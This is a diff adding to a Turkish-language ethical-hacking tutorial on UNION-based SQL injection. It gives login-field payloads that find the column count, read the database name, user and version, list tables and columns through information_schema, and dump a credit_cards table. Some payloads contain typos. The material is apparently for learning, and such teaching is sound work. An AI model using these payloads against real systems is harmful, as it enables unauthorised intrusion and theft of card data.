@@ -949,8 +949,73 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
   | Password | 123dasdas' ORDER BY 1# |
 
 > ## SQL Union Select
+
 > ## SQL Union Select Sütun Sayısı Öğrenme
-> ## SQL Union Select Database Öğrenme
+
+- Database'dei sütun sayısını öğrenirken ```UNION SELECT``` kullanırız
+
+- | Kullanıcı Adı | jamess' union select 1,1,1,1,1# | 
+  | --- | --- |
+  | Password | 123dasdas|
+
+- Şekinde tek tek deniyoruz (jamess' union select 1#, jamess' union select 1,1#, jamess' union select 1,1,1#...)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.11.52.jpeg)
+
+- Database'deki hangi sütunların kullanıldığını öğrenmemiz gerekiyor bunun için (örneğin 5 sütunlu bir site);
+- | Kullanıcı Adı | jamess' union select 1,2,3,4,5# | 
+  | --- | --- |
+  | Password | 123dasdas|
+  
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.12.35.jpeg)
+
+- 2,3 ve 4. sütunların kullanıldığını öğrendik
+
+> ## SQL Union Select Database Öğrenme 
+
+- Database ismi, kullanıcı bilgisi, version vs öğrenebiliriz bunu için;
+
+- | Kullanıcı Adı | jamess' union select 1,database(),user(),version(),5# | 
+  | --- | --- |
+  | Password | 123dasdas|
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.16.13.jpeg)
+
 > ## SQL Union Select Tablo İsimlerini Öğrenme
+
+- ```MYSQL```: İnternette duran sql sunucularıdır 
+- ```MYSQL``` içinde ```information_schema``` vardır ve bilgiler onun içinde saklanır
+- Tablo isimilerni öğrenirken bizde ```information_schema```'yı kullanıyoruz
+
+- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.tables# | 
+  | --- | --- |
+  | Password | 123dasdas|
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.22.51.jpeg)
+
+- Ancak bu yöntemle web server'ındaki tüm tablo isimlerini görürüz bunu filtrelemek için ```WHERE``` kullanırı
+  
+- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.tables wwhere table_schema='{database ismi}'# | 
+  | --- | --- |
+  | Password | 123dasdas|
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.30.00.jpeg)
+
 > ## SQL Union Select Sütun İsimlerini Öğrenme
+
+- | Kullanıcı Adı | jamess' union select 1,table_name,null,null,5 from information_schema.columns where table_name='{tablo isimi}'# | 
+  | --- | --- |
+  | Password | 123dasdas|
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.31.04.jpeg)
+	
 > ## SQL Union Select Sütun İçindeki Bilgileri Öğrenme
+
+-Sütun içindeki verileri görmek için sütun isimlerini yazıyoruz
+
+- | Kullanıcı Adı | jamess' union select 1,ccnumber,ccv,expiration,5 from credit_cards# | 
+  | --- | --- |
+  | Password | 123dasdas|
+  
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2019.36.01.jpeg)
+
